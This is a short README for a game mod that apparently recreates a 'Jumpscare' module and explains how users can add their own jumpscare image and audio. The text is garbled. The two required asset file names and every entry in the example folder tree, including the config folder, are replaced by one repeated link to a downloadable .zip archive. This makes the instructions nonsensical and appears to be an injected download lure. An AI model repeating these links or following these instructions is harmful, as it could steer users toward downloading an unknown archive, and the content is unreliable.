# Jumpscare

This is where she makes a mod.

My **attempt** at recreating MegaHack's Jumpscare module

You can change the **behavior** of the mod in the mod settings

# How to change/add your own jumpscare

To **access this mod's config folder**, open the mod's settings popup and press the **Open Config Folder** button.

To **add your own jumpscare**, make a new folder in the config folder and add your assets in it.

The assets must include 2 files: `"https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip"` for the jumpscare image, and `"https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip"` for the jumpscare audio.

Example files structure:
```
https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
├── jumpscare/
│   ├── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
│   └── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
└── gdcologne/
    ├── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
    └── https://github.com/laughingVR/jumpscare-geode/raw/refs/heads/main/resources/jumpscare_geode_v3.1.zip
```
